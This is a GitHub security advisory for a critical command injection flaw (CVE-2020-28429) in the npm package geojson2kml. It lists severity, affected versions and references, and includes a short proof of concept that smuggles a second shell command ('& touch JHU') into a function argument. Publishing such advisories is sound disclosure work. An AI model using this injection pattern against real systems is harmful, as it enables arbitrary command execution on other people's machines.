# [C] Command Injection in geojson2kml

## Summary
Severity: Critical
Advisory: GHSA-w83x-fp72-p9qc
CVE: CVE-2020-28429
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-05-10
Source: https://github.com/advisories/GHSA-w83x-fp72-p9qc
Type: github-advisory

## Affected
- npm: `geojson2kml` — affected >=0

## Details
All versions up to and including version 0.1.1 of package geojson2kml are vulnerable to Command Injection via the index.js file. 

### PoC: 
```js
var a =require("geojson2kml"); 
a("./","& touch JHU",function(){})
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-28429
- https://snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412
